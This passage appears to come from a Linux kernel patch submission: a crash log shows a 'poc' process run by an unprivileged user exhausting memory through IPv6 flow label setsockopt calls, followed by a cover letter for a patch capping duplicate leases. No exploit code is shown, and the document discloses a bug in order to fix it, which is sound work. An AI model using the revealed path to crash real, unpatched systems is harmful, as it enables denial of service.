[  261.543133][ T9280] [   9138]    33  9138    14190      471      469        2         0    90112        0             0 nginx
[  261.547022][ T9280] [   9268]     0  9268     3452      292      290        2         0    65536        0             0 sshd
[  261.550363][ T9280] [   9274]  1001  9274     3452      292      290        2         0    65536        0             0 sshd
[  261.555411][ T9280] [   9275]  1001  9275     8478       21       20        1         0    49152        0             0 poc
[  261.562751][ T9280] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
[  261.563851][ T9280] CPU: 0 UID: 1001 PID: 9280 Comm: poc Not tainted 7.1.0-rc2-g6f381f63ccfe-dirty #3 PREEMPT(full)
[  261.565268][ T9280] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  261.566854][ T9280] Call Trace:
[  261.567335][ T9280]  <TASK>
[  261.567745][ T9280]  dump_stack_lvl+0x3b/0x1f0
[  261.568422][ T9280]  vpanic+0x99f/0xa80
[  261.568920][ T9280]  ? __pfx_vpanic+0x10/0x10
[  261.569945][ T9280]  ? _raw_spin_unlock_irqrestore+0x3b/0x80
[  261.570624][ T9280]  panic+0xca/0xd0
[  261.571061][ T9280]  ? __pfx_panic+0x10/0x10
[  261.571616][ T9280]  ? __rcu_read_unlock+0x297/0x5c0
[  261.572205][ T9280]  ? dump_header+0x6e9/0x980
[  261.572737][ T9280]  ? out_of_memory+0x8a8/0x1680
[  261.573304][ T9280]  out_of_memory+0x8d6/0x1680
[  261.574031][ T9280]  ? __pfx_out_of_memory+0x10/0x10
[  261.575240][ T9280]  __alloc_frozen_pages_noprof+0x2309/0x2b00
[  261.576097][ T9280]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10
[  261.576968][ T9280]  ? __lock_acquire+0x45c/0x25f0
[  261.577706][ T9280]  ? __sanitizer_cov_trace_switch+0x54/0x90
[  261.578706][ T9280]  ? policy_nodemask+0xed/0x4f0
[  261.579438][ T9280]  alloc_pages_mpol+0x1fb/0x540
[  261.580002][ T9280]  ? __pfx_alloc_pages_mpol+0x10/0x10
[  261.580626][ T9280]  ? __lock_acquire+0x45c/0x25f0
[  261.581225][ T9280]  ? unwind_get_return_address+0x59/0xa0
[  261.581856][ T9280]  new_slab+0x458/0x670
[  261.582395][ T9280]  ? find_held_lock+0x2b/0x80
[  261.582988][ T9280]  ___slab_alloc+0x2c4/0x7f0
[  261.583521][ T9280]  ? fl_create+0x104/0xd30
[  261.584046][ T9280]  ? __pcs_replace_empty_main+0x3e3/0x640
[  261.584713][ T9280]  __kmalloc_cache_noprof+0x389/0x6e0
[  261.585323][ T9280]  ? fl_create+0x104/0xd30
[  261.586423][ T9280]  fl_create+0x104/0xd30
[  261.587324][ T9280]  ? do_sock_setsockopt+0xf3/0x1d0
[  261.587919][ T9280]  ? __sys_setsockopt+0x19a/0x230
[  261.588479][ T9280]  ? __x64_sys_setsockopt+0xbd/0x160
[  261.589085][ T9280]  ? do_syscall_64+0x116/0xf80
[  261.589666][ T9280]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  261.590941][ T9280]  ? __pfx_fl_create+0x10/0x10
[  261.591522][ T9280]  ? __lock_acquire+0x45c/0x25f0
[  261.592115][ T9280]  ? find_held_lock+0x2b/0x80
[  261.592657][ T9280]  ? __might_fault+0xbc/0x130
[  261.593192][ T9280]  ? __might_fault+0xbc/0x130
[  261.593718][ T9280]  ipv6_flowlabel_opt+0x50f/0x2d70
[  261.594526][ T9280]  ? __pfx_ipv6_flowlabel_opt+0x10/0x10
[  261.595450][ T9280]  ? __pfx_do_raw_spin_lock+0x10/0x10
[  261.596203][ T9280]  ? __local_bh_enable_ip+0xa2/0x120
[  261.596834][ T9280]  ? do_ipv6_setsockopt+0x1b4a/0x4640
[  261.597495][ T9280]  do_ipv6_setsockopt+0x1b4a/0x4640
[  261.598187][ T9280]  ? __print_lock_name+0x40/0xe0
[  261.598975][ T9280]  ? __pfx_do_ipv6_setsockopt+0x10/0x10
[  261.599667][ T9280]  ? avc_has_perm_noaudit+0x11e/0x3b0
[  261.600306][ T9280]  ? avc_has_perm_noaudit+0x145/0x3b0
[  261.600919][ T9280]  ? avc_has_perm+0x141/0x1f0
[  261.601469][ T9280]  ? __pfx_avc_has_perm+0x10/0x10
[  261.602073][ T9280]  ? find_held_lock+0x2b/0x80
[  261.603002][ T9280]  ? finish_task_switch.isra.0+0x2c3/0x1080
[  261.603860][ T9280]  ? sock_has_perm+0x25a/0x2f0
[  261.604575][ T9280]  ? __pfx_sock_has_perm+0x10/0x10
[  261.605301][ T9280]  ? selinux_netlbl_socket_setsockopt+0x183/0x470
[  261.606436][ T9280]  ? __pfx_selinux_netlbl_socket_setsockopt+0x10/0x10
[  261.607419][ T9280]  ? ipv6_setsockopt+0xcb/0x170
[  261.608113][ T9280]  ipv6_setsockopt+0xcb/0x170
[  261.608857][ T9280]  udpv6_setsockopt+0x64/0xb0
[  261.609612][ T9280]  ? __pfx_sock_common_setsockopt+0x10/0x10
[  261.610571][ T9280]  do_sock_setsockopt+0xf3/0x1d0
[  261.612186][ T9280]  __sys_setsockopt+0x19a/0x230
[  261.613047][ T9280]  __x64_sys_setsockopt+0xbd/0x160
[  261.613916][ T9280]  ? do_syscall_64+0x90/0xf80
[  261.615052][ T9280]  ? lockdep_hardirqs_on+0x7b/0x110
[  261.615874][ T9280]  do_syscall_64+0x116/0xf80
[  261.616540][ T9280]  ? clear_bhb_loop+0x40/0x90
[  261.617298][ T9280]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  261.618259][ T9280] RIP: 0033:0x4218ce
[  261.618931][ T9280] Code: Unable to access opcode bytes at 0x4218a4.
[  261.620078][ T9280] RSP: 002b:00007fb2b56d01e8 EFLAGS: 00000286 ORIG_RAX: 0000000000000036
[  261.621431][ T9280] RAX: ffffffffffffffda RBX: 00000000000e4359 RCX: 00000000004218ce
[  261.623069][ T9280] RDX: 0000000000000020 RSI: 0000000000000029 RDI: 0000000000000006
[  261.624254][ T9280] RBP: 000000000968d9a0 R08: 0000000000000020 R09: 0000000000000000
[  261.625393][ T9280] R10: 00007fb2b56d01f0 R11: 0000000000000286 R12: 0000000000000006
[  261.626819][ T9280] R13: 00007fb2b56d01f0 R14: 0000000000499075 R15: 00007fff06d5a7d0
[  261.628875][ T9280]  </TASK>
[  261.629974][ T9280] Kernel Offset: disabled
[  261.630682][ T9280] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipv6: flowlabel: cap duplicate leases per socket

 net/ipv6/ip6_flowlabel.c | 18 ++++++++++++++----
 1 file changed, 14 insertions(+), 4 deletions(-)

-- 
2.43.0
